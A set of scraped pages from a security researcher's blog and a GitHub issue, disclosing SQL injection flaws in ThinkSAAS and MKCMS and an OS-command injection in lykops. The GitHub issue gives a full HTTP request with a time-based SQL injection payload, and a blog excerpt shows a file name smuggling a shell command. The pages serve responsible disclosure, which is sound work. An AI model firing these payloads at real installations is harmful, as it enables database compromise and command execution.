  0x01 Summay In last December last year, there were security problems caused by improper URLDecode. Reference https://github.com/thinksaas/ThinkSAAS/issues/24 To sum up, it is in ThinkSAAS-master\app\topic\action\admin\topic.php , improper filtering of keyword parameters leads to SQL injection. In last year's fix plan (click Here Direct), the first is $title Changed $kw Variable, And, after tsFilter Function filtering. However, there are still security risks now. # Responsible Vulnerability Disclosure info Title: ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php Desc: ThinkSAAS before 3.52 has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter（need the privilege of admin）, allowing logged attackers to execute arbitrary SQL commands. This is a bypass of CVE-2020-35337. CVSS v3.1 Vector: - 7.5 AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:H/MPR:H/...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[1 条评论](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html#comments)

[阅读全文](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html "ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php#2 （bypass of CVE-2020-35337）")

### 归档

* [七月 20211](https://blog.unc1e.com/2021/07/)
* [二月 20211](https://blog.unc1e.com/2021/02/)
* [十二月 20201](https://blog.unc1e.com/2020/12/)
* [四月 20201](https://blog.unc1e.com/2020/04/)

### 标签

* [CVE](https://blog.unc1e.com/search/label/CVE)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)

[由 Blogger 提供支持](https://www.blogger.com)



=== Content from blog.unc1e.com_29dcc15f_20250119_133151.html ===

[跳至主要内容](#main)

# [unc1e's penetration articles](https://blog.unc1e.com/)

搜索

### 搜索此博客

## 博文

目前显示的是 四月, 2020的博文

[显示全部](https://blog.unc1e.com/)

### [MKCMS V6.2 has mutilple vulnerabilities](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html)

[四月 11, 2020](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html "permanent link")

0x00:Lead In Source code can be downloaded  at  https://www.lanzous.com/ib7zwmh This CMS is kinda funny, coz there is a universal filter addslashes  in /system/library.php /system/library.php <?php ... if ( ! get\_magic\_quotes\_gpc ()) { if ( ! empty ( $\_GET )) { $\_GET = addslashes\_deep ( $\_GET ); } if ( ! empty ( $\_POST )) { $\_POST = addslashes\_deep ( $\_POST ); } $\_COOKIE = addslashes\_deep ( $\_COOKIE ); $\_REQUEST = addslashes\_deep ( $\_REQUEST ); } function addslashes\_deep ( $\_var\_0 ) { if ( empty ( $\_var\_0 )) { return $\_var\_0 ; } else { return is\_array ( $\_var\_0 ) ? array\_map ( 'addslashes\_deep' , $\_var\_0 ) : addslashes ( $\_var\_0 ); } \_var\_0 } While it uses stripslashes somewhere by mistake, let's do a global search about it, we get 3 SQL injections 0x01:PreAuth SQL injection in /ucenter/repass.php MKCMS V6.2 has SQL injection via the /ucenter/repass.php n...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[发表评论](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html#comments)

[阅读全文](https://blog.unc1e.com/2020/04/mkcms-v62-has-mutilple-vulnerabilities.html "MKCMS V6.2 has mutilple vulnerabilities")

### 归档

* [七月 20211](https://blog.unc1e.com/2021/07/)
* [二月 20211](https://blog.unc1e.com/2021/02/)
* [十二月 20201](https://blog.unc1e.com/2020/12/)
* [四月 20201](https://blog.unc1e.com/2020/04/)

### 标签

* [CVE](https://blog.unc1e.com/search/label/CVE)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)

[由 Blogger 提供支持](https://www.blogger.com)



=== Content from github.com_d998b67b_20250119_114447.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fthinksaas%2FThinkSAAS%2Fissues%2F24)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fthinksaas%2FThinkSAAS%2Fissues%2F24)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=thinksaas%2FThinkSAAS)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[thinksaas](/thinksaas)
/
**[ThinkSAAS](/thinksaas/ThinkSAAS)**
Public

* [Notifications](/login?return_to=%2Fthinksaas%2FThinkSAAS) You must be signed in to change notification settings
* [Fork
  62](/login?return_to=%2Fthinksaas%2FThinkSAAS)
* [Star
   251](/login?return_to=%2Fthinksaas%2FThinkSAAS)

* [Code](/thinksaas/ThinkSAAS)
* [Issues
  19](/thinksaas/ThinkSAAS/issues)
* [Pull requests
  2](/thinksaas/ThinkSAAS/pulls)
* [Actions](/thinksaas/ThinkSAAS/actions)
* [Projects
  0](/thinksaas/ThinkSAAS/projects)
* [Security](/thinksaas/ThinkSAAS/security)
* [Insights](/thinksaas/ThinkSAAS/pulse)

Additional navigation options

* [Code](/thinksaas/ThinkSAAS)
* [Issues](/thinksaas/ThinkSAAS/issues)
* [Pull requests](/thinksaas/ThinkSAAS/pulls)
* [Actions](/thinksaas/ThinkSAAS/actions)
* [Projects](/thinksaas/ThinkSAAS/projects)
* [Security](/thinksaas/ThinkSAAS/security)
* [Insights](/thinksaas/ThinkSAAS/pulse)

# Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php SQL注入 #24

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php SQL注入](#top)#24Copy link![@hi-unc1e](https://avatars.githubusercontent.com/u/67778054?v=4&size=80)
## Description

![@hi-unc1e](https://avatars.githubusercontent.com/u/67778054?v=4&size=48)[hi-unc1e](https://github.com/hi-unc1e)opened [on Dec 3, 2020](https://github.com/thinksaas/ThinkSAAS/issues/24#issue-756055263)

* Details can be retrived in <https://blog.unc1e.com/2020/12/thinksaas-has-post-auth-sql-injection.html>
* PDF, [Thinksaas has a Post-Auth SQL injection vulnerability in app\_topic\_action\_admin\_topic.php.pdf](https://github.com/thinksaas/ThinkSAAS/files/5635300/Thinksaas.has.a.Post-Auth.SQL.injection.vulnerability.in.app_topic_action_admin_topic.php.pdf)
* Author of the vuln: Qianxin, Network Security Department, Product-Safety Team ( Unc1e )

# app/topic/action/admin/topic.php 的title参数存在SQL注入漏洞

```
GET /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC%%2527+and/**/1-(select/**/1/**/from/**/(select+sleep(3))a)%2523%2520 HTTP/1.1
Host: thinksaas
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4230.1 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-SG,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://thinksaas/index.php?app=search&ac=s&kw=keyword
Cookie: PHPSESSID=6im4ssqo33h8l2d43u78nbr4c3;  ts_autologin=goh59atl3dsk44o4sws48s80co44ww8
Upgrade-Insecure-Requests: 1

```

Will cause a delay of 6 seconds

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from blog.unc1e.com_cb965316_20250119_133148.html ===

[跳至主要内容](#main)

# [unc1e's penetration articles](https://blog.unc1e.com/)

搜索

### 搜索此博客

## 博文

目前显示的是 二月, 2021的博文

[显示全部](https://blog.unc1e.com/)

### [lykops has multiple vulnerabilities](https://blog.unc1e.com/2021/02/lykops-has-multiple-vulnerabilities.html)

[二月 06, 2021](https://blog.unc1e.com/2021/02/lykops-has-multiple-vulnerabilities.html "permanent link")

corresponding 0x00     intro - github repo：https://github.com/lykops/lykops - 121 stars and 65 forks til 2021/2/6 0x01     Post-Auth OS-command injection lykops/library/utils/file.py#248   -> upload\_file() we got  lykops/lykops/ansible/yaml.py#74 ，github link here vuln param file comes from our HTTP Request in array of FILES[]  So we can completely control the unsantized param, and cause a OS-cmd injection the corresponding route is ^ansible/yaml/import$ , we can trigger this vuln by visiting it. Also, you can see that an exception will trigger twice invocations  of  import\_file() ，which means a  `sleep 5`   command will casue a delay of 10 second POST /ansible/yaml/import/  Host: lykops ... ... ...;filename="test.txt$(sleep 5)" ...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[1 条评论](https://blog.unc1e.com/2021/02/lykops-has-multiple-vulnerabilities.html#comments)

[阅读全文](https://blog.unc1e.com/2021/02/lykops-has-multiple-vulnerabilities.html#more "lykops has multiple vulnerabilities")

[更多博文](https://blog.unc1e.com/search?updated-max=2021-02-06T04:20:00-04:00&max-results=7 "更多博文")

### 归档

* [七月 20211](https://blog.unc1e.com/2021/07/)
* [二月 20211](https://blog.unc1e.com/2021/02/)
* [十二月 20201](https://blog.unc1e.com/2020/12/)
* [四月 20201](https://blog.unc1e.com/2020/04/)

### 标签

* [CVE](https://blog.unc1e.com/search/label/CVE)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)

[由 Blogger 提供支持](https://www.blogger.com)



=== Content from blog.unc1e.com_d0fe6e0e_20250119_133150.html ===

[跳至主要内容](#main)

# [unc1e's penetration articles](https://blog.unc1e.com/)

搜索

### 搜索此博客

## 博文

目前显示的是 七月, 2021的博文

[显示全部](https://blog.unc1e.com/)

### [ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php#2 （bypass of CVE-2020-35337）](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html)

[七月 31, 2021](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html "permanent link")

  0x01 Summay In last December last year, there were security problems caused by improper URLDecode. Reference https://github.com/thinksaas/ThinkSAAS/issues/24 To sum up, it is in ThinkSAAS-master\app\topic\action\admin\topic.php , improper filtering of keyword parameters leads to SQL injection. In last year's fix plan (click Here Direct), the first is $title Changed $kw Variable, And, after tsFilter Function filtering. However, there are still security risks now. # Responsible Vulnerability Disclosure info Title: ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php Desc: ThinkSAAS before 3.52 has SQL injection via the /index.php?app=topic&ac=admin&mg=topic&ts=list&title=PoC title parameter（need the privilege of admin）, allowing logged attackers to execute arbitrary SQL commands. This is a bypass of CVE-2020-35337. CVSS v3.1 Vector: - 7.5 AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RL:O/RC:C/CR:H/IR:H/AR:H/MAV:N/MAC:H/MPR:H/...

共享

* 获取链接
* Facebook
* X
* Pinterest
* 电子邮件
* 其他应用

[1 条评论](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html#comments)

[阅读全文](https://blog.unc1e.com/2021/07/thinksaas-has-post-auth-sql-injection.html "ThinkSAAS has a Post-Auth SQL injection vulnerability in app/topic/action/admin/topic.php#2 （bypass of CVE-2020-35337）")

[更多博文](https://blog.unc1e.com/search?updated-max=2021-07-31T04:57:00-04:00&max-results=7 "更多博文")

### 归档

* [七月 20211](https://blog.unc1e.com/2021/07/)
* [二月 20211](https://blog.unc1e.com/2021/02/)
* [十二月 20201](https://blog.unc1e.com/2020/12/)
* [四月 20201](https://blog.unc1e.com/2020/04/)

### 标签

* [CVE](https://blog.unc1e.com/search/label/CVE)

### [举报滥用情况](https://www.blogger.com/go/report-abuse)

[由 Blogger 提供支持](https://www.blogger.com)


